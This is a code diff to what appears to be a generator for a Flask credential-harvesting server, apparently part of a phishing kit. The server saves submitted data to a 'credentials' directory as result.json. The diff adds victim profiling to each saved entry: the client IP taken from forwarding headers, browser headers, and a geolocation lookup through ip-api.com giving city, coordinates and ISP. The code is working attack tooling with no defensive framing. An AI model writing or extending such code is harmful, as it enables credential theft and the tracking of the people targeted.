@@ -17,6 +17,61 @@ app = Flask(__name__)
 SITE_ROOT = r"{os.path.abspath(site_root)}"
 CREDS_DIR = r"{os.path.abspath(site_credentials_dir)}"
 
+def get_geoip_data(ip):
+    try:
+        import requests
+        response = requests.get(f"http://ip-api.com/json/{{ip}}", timeout=2)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('status') == 'success':
+                return {{
+                    'country': data.get('country'),
+                    'country_code': data.get('countryCode'),
+                    'region': data.get('regionName'),
+                    'city': data.get('city'),
+                    'zip': data.get('zip'),
+                    'lat': data.get('lat'),
+                    'lon': data.get('lon'),
+                    'timezone': data.get('timezone'),
+                    'isp': data.get('isp'),
+                    'org': data.get('org'),
+                    'as': data.get('as')
+                }}
+    except:
+        pass
+    return None
+
+def get_client_ip():
+    if request.headers.get('X-Forwarded-For'):
+        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    elif request.headers.get('X-Real-IP'):
+        return request.headers.get('X-Real-IP')
+    return request.remote_addr
+
+def get_client_info():
+    client_ip = get_client_ip()
+    
+    info = {{
+        'ip': client_ip,
+        'remote_addr': request.remote_addr,
+        'x_forwarded_for': request.headers.get('X-Forwarded-For'),
+        'x_real_ip': request.headers.get('X-Real-IP'),
+        'user_agent': request.headers.get('User-Agent'),
+        'accept_language': request.headers.get('Accept-Language'),
+        'referer': request.headers.get('Referer'),
+        'accept': request.headers.get('Accept'),
+        'accept_encoding': request.headers.get('Accept-Encoding'),
+        'host': request.headers.get('Host'),
+        'origin': request.headers.get('Origin'),
+        'timestamp': str(datetime.datetime.now())
+    }}
+    
+    geo_data = get_geoip_data(client_ip)
+    if geo_data:
+        info['geo'] = geo_data
+    
+    return info
+
 def save_credentials(data):
     os.makedirs(CREDS_DIR, exist_ok=True)
     creds_file = os.path.join(CREDS_DIR, "result.json")
@@ -28,10 +83,13 @@ def save_credentials(data):
             creds = []
     except:
         creds = []
+    
     entry = {{
         "timestamp": str(datetime.datetime.now()),
-        "data": data
+        "data": data,
+        "client_info": get_client_info()
     }}
+    
     creds.append(entry)
     with open(creds_file, 'w') as f:
         json.dump(creds, f, indent=2)
